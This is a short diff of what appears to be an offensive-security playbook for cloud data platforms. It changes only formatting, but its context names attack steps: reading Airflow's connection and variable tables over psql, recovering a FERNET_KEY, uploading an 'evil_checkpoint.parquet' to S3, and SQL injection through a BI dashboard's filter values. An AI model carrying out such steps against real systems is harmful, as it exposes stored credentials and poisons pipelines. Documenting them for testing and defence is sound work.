@@ -920,9 +920,9 @@ psql "host=rds-host.cluster-x.rds.amazonaws.com \
 
 # Inspect tables
 \dt
-SELECT count(*) FROM connection;
-SELECT count(*) FROM variable;
-SELECT count(*) FROM dag_run;
+# SELECT count(*) FROM connection;
+# SELECT count(*) FROM variable;
+# SELECT count(*) FROM dag_run;
 ```
 
 ### FERNET_KEY Recovery
@@ -1204,7 +1204,7 @@ aws s3 cp ./evil_checkpoint.parquet \
 
 ### BigQuery SQLi via bq Query String
 
-```bash
+```text
 # Many embedded BI tools concatenate filter values:
 https://bi.target/dashboards/sales?region=US
 
